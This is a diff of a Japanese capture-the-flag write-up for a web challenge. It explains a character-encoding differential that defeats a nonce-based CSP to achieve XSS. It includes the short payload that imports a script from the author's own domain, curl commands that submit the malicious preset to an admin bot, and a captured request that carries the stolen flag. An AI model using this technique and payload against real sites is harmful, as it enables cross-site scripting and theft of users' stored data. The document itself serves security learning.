@@ -187,7 +187,7 @@ polka()
 どうやら`title`で`meta`と`link`以外のタグを挿入できるようだ。  
 ただし、CSPが`script-src 'nonce-${nonce}'; style-src 'nonce-${nonce}'; child-src 'self'; object-src 'none'`とされていて厳しい。  
 Dangling Markup Injectionも可能だが、CSSの`#`で止まってしまうためscriptの`nonce`は奪えそうにない。  
-ここで`name`と`prefix`のような二つの入力で文字エンコードを一時的にバグらせてXSSする「[Encoding Differentials: Why Charset Matters](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)」を思い出す。  
+ここで`name`と`prefix`のような二つの入力で文字エンコーディングを一時的にバグらせてXSSする「[Encoding Differentials: Why Charset Matters](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)」を思い出す。  
 Content-Typeにcharsetがないことが条件なので、チェックする。  
 ```bash
 $ curl http://104.198.119.144:7891/ -i
@@ -210,8 +210,8 @@ Content-Length: 1435
 すると、`nonce`が付いたscriptタグを異なるエンコーディングとして解釈させることができる。  
 `";alert(1)//`を`prefix`とすると`const prefix = "\";alert(1)//"`とダブルクオートがエスケープされるが、`name`を`</title><img src="\u001b(J`にし、エンコーディングを変化させると`const prefix = "¥";alert(1)//"`(`\`でない)となるためalertすることがわかる。  
 あとは`localStorage`を盗むだけだが、`prefix`としてスクリプトに挿入する文字数が25以上だと`prefix too long`と怒られる。  
-幸いにも`s4t.pw`という短いドメインを持っているため、`";import("//s4t.pw")//`で十分だ。  
-以下のs4t.pyをサーバで実行しておく。  
+幸いにも`s4t.pw`という短いドメインを持っているため、``";import(`//s4t.pw`)//``で十分だ。  
+以下のs4t.pyを自身のサーバで実行しておく。  
 ```py
 from flask import Flask
 from flask_cors import CORS
@@ -245,7 +245,7 @@ $ curl -X POST http://104.198.119.144:7891/preset -H 'Content-Type: application/
 $ curl -X POST http://104.198.119.144:7891/report -H 'Content-Type: application/json' -d '{"path":"/presets/j3vBwZ1jKz4riRhkTBuor"}'
 {"message":"Reported. Admin will check the page."}
 ```
-するとs4t.pwで以下のリクエストを受け取る。  
+すると自身のサーバで以下のリクエストを受け取る。  
 ```
 GET /
 GET /?flag=TSGCTF{8ab2815d40|reset!if%20d<P653124710Y|ac7aa4}
